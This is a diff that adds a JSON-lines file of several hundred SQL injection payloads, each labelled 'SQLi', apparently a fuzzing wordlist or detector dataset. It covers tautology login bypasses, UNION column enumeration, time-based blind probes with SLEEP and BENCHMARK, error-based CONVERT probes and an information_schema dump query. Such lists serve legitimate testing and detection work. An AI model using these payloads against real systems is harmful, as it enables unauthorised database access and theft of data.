@@ -1,0 +1,759 @@
+{"payload": "or true", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26", "type": "SQLi"}
+{"payload": "OR 1=0--", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#", "type": "SQLi"}
+{"payload": ") or ('1′='1–", "type": "SQLi"}
+{"payload": "\" or 1=1 –", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19", "type": "SQLi"}
+{"payload": "%' AND 8310=8311 AND '%'='", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28", "type": "SQLi"}
+{"payload": "' UNION ALL SELECT 1, @@version;#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--", "type": "SQLi"}
+{"payload": "' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055", "type": "SQLi"}
+{"payload": "ORDER BY 21#", "type": "SQLi"}
+{"payload": "AnD SLEEP(5)#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--", "type": "SQLi"}
+{"payload": "HAVING 1=1#", "type": "SQLi"}
+{"payload": "AND 1083=1083 AND ('1427=1427", "type": "SQLi"}
+{"payload": "ORDER BY 12#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--", "type": "SQLi"}
+{"payload": "waitfor delay '00:00:05'", "type": "SQLi"}
+{"payload": "UNION ALL SELECT SLEEP(5)--", "type": "SQLi"}
+{"payload": "' OR 'x'='x'#;", "type": "SQLi"}
+{"payload": "AND 1=1", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22", "type": "SQLi"}
+{"payload": "'\"", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "\" or 1=1 --", "type": "SQLi"}
+{"payload": "\" or \"1\"=\"1\"/*", "type": "SQLi"}
+{"payload": "ORDER BY 11", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))", "type": "SQLi"}
+{"payload": "or benchmark(50000000,MD5(1))#", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))", "type": "SQLi"}
+{"payload": "' and a='a", "type": "SQLi"}
+{"payload": "ORDER BY 11--", "type": "SQLi"}
+{"payload": "' or a=a--", "type": "SQLi"}
+{"payload": "ORDER BY 15#", "type": "SQLi"}
+{"payload": "' and 1='1", "type": "SQLi"}
+{"payload": "AND 1=1--", "type": "SQLi"}
+{"payload": "ORDER BY 20", "type": "SQLi"}
+{"payload": "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7#", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "ORDER BY 14#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "' or userid like '%", "type": "SQLi"}
+{"payload": "ORDER BY 8", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#", "type": "SQLi"}
+{"payload": "ORDER BY 26--", "type": "SQLi"}
+{"payload": "' or 1=1 LIMIT 1;#", "type": "SQLi"}
+{"payload": "HAVING 1=1--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--", "type": "SQLi"}
+{"payload": "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8--", "type": "SQLi"}
+{"payload": "ORDER BY 2--", "type": "SQLi"}
+{"payload": "OR x=x", "type": "SQLi"}
+{"payload": "AND 7506=9091 AND (5913=5913", "type": "SQLi"}
+{"payload": "ORDER BY 15", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--", "type": "SQLi"}
+{"payload": "AND 7506=9091 AND ('5913=5913", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#", "type": "SQLi"}
+{"payload": "\" or 1=1–", "type": "SQLi"}
+{"payload": "OR x=y--", "type": "SQLi"}
+{"payload": "and (select substring(@@version,3,1))='c'", "type": "SQLi"}
+{"payload": "OR x=y#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#", "type": "SQLi"}
+{"payload": "ORDER BY 7#", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#", "type": "SQLi"}
+{"payload": "and (select substring(@@version,2,1))='i'", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8", "type": "SQLi"}
+{"payload": "ORDER BY 30", "type": "SQLi"}
+{"payload": "ORDER BY 11#", "type": "SQLi"}
+{"payload": "\")", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5)--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX'", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--", "type": "SQLi"}
+{"payload": "\"))", "type": "SQLi"}
+{"payload": "\" or \"a\"=\"a", "type": "SQLi"}
+{"payload": "ORDER BY 20--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18", "type": "SQLi"}
+{"payload": "AND 7300=7300 AND 'pKlZ'='pKlZ", "type": "SQLi"}
+{"payload": "ORDER BY 27#", "type": "SQLi"}
+{"payload": "')", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--", "type": "SQLi"}
+{"payload": "') or '1'='1'/*", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--", "type": "SQLi"}
+{"payload": "' or 1=1#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--", "type": "SQLi"}
+{"payload": ")", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#", "type": "SQLi"}
+{"payload": "\") or (\"1\"=\"1\"/*", "type": "SQLi"}
+{"payload": "ORDER BY 5--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#", "type": "SQLi"}
+{"payload": "ORDER BY 18#", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))", "type": "SQLi"}
+{"payload": "') or ('1'='1'--", "type": "SQLi"}
+{"payload": "\" or 1=1/*", "type": "SQLi"}
+{"payload": "%' AND 8310=8310 AND '%'='", "type": "SQLi"}
+{"payload": "AND 1=0--", "type": "SQLi"}
+{"payload": "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#", "type": "SQLi"}
+{"payload": "\" or \"1\"=\"1", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4#", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),4#", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--", "type": "SQLi"}
+{"payload": ") or '1′='1–", "type": "SQLi"}
+{"payload": "pg_SLEEP(5)#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27", "type": "SQLi"}
+{"payload": "AND 1=0#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18", "type": "SQLi"}
+{"payload": "ORDER BY 23#", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#", "type": "SQLi"}
+{"payload": "' or '1′='1", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8", "type": "SQLi"}
+{"payload": "and (select substring(@@version,3,1))='S'", "type": "SQLi"}
+{"payload": "ORDER BY 18", "type": "SQLi"}
+{"payload": "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#", "type": "SQLi"}
+{"payload": "\" AND 1=0 UNION ALL SELECT \"\", \"81dc9bdb52d04dc20036dbd8313ed055", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16", "type": "SQLi"}
+{"payload": "') or ('1'='1'#", "type": "SQLi"}
+{"payload": "ORDER BY 10", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))--", "type": "SQLi"}
+{"payload": "\" or \"1\"=\"1\"--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--", "type": "SQLi"}
+{"payload": "ORDER BY 8--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23", "type": "SQLi"}
+{"payload": "SLEEP(5)#", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5", "type": "SQLi"}
+{"payload": "' or 1=1 –", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#", "type": "SQLi"}
+{"payload": "SLEEP(5)--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "OR 1=1--", "type": "SQLi"}
+{"payload": "ORDER BY 16--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8", "type": "SQLi"}
+{"payload": "' or user like '%", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#", "type": "SQLi"}
+{"payload": "\" or 1=1#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#", "type": "SQLi"}
+{"payload": "\" or 0=0 #", "type": "SQLi"}
+{"payload": "or 1=1–", "type": "SQLi"}
+{"payload": "\") or (\"1\"=\"1\"--", "type": "SQLi"}
+{"payload": "' or uname like '%", "type": "SQLi"}
+{"payload": "' or 'one'='one–", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25", "type": "SQLi"}
+{"payload": "'/*", "type": "SQLi"}
+{"payload": "ORDER BY 22", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#", "type": "SQLi"}
+{"payload": "OR 3409=3409 AND ('pytW' LIKE 'pytY", "type": "SQLi"}
+{"payload": "' UNION select table_schema,table_name FROM information_Schema.tables;#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),3--", "type": "SQLi"}
+{"payload": "HAVING 1=0#", "type": "SQLi"}
+{"payload": "AND 7300=7300 AND 'pKlZ'='pKlY", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))--", "type": "SQLi"}
+{"payload": "WHERE 1=1 AND 1=0--", "type": "SQLi"}
+{"payload": "ORDER BY 6", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--", "type": "SQLi"}
+{"payload": "ORDER BY 9", "type": "SQLi"}
+{"payload": "or 0=0 #", "type": "SQLi"}
+{"payload": "ORDER BY 12", "type": "SQLi"}
+{"payload": "'=' 'or' and '=' 'or'", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13", "type": "SQLi"}
+{"payload": "' and substring(password/text(),1,1)='7", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16", "type": "SQLi"}
+{"payload": "UNION ALL SELECT USER()--", "type": "SQLi"}
+{"payload": "%')", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10", "type": "SQLi"}
+{"payload": "OR x=x#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--", "type": "SQLi"}
+{"payload": "RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),3,4#", "type": "SQLi"}
+{"payload": "' or 0=0 --", "type": "SQLi"}
+{"payload": "HAVING 1=0", "type": "SQLi"}
+{"payload": "ORDER BY 17--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3#", "type": "SQLi"}
